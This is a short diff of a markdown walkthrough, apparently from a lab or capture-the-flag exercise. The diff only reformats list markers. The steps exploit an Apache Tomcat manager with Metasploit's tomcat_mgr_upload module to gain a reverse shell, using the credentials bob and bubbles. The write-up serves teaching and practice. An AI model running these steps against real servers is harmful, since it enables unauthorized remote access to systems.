@@ -52,10 +52,10 @@ This will give the version of the server `Apache/2.4.18`.
 ## Exploitation Methods
 
 ### Method 1 - Using Metasploit
--> open the metasploit console using the command `msfconsole`.
--> run the command `search type:exploit tomcat` to search for the exploits of tomcat.
--> using the command `use exploit/multi/http/tomcat_mgr_upload`, select the exploit `exploit/multi/http/tomcat_mgr_upload` since we are dealing with the uploading of a script to get the reverse shell.
--> use command `show options` to see the options that we need to fill up before running the exploit. now we have to run the following command to add the required options:
+- open the metasploit console using the command `msfconsole`.
+- run the command `search type:exploit tomcat` to search for the exploits of tomcat.
+- using the command `use exploit/multi/http/tomcat_mgr_upload`, select the exploit `exploit/multi/http/tomcat_mgr_upload` since we are dealing with the uploading of a script to get the reverse shell.
+- use command `show options` to see the options that we need to fill up before running the exploit. now we have to run the following command to add the required options:
 1. set target 0
 2. set httppassword bubbles
 3. set httpusername bob
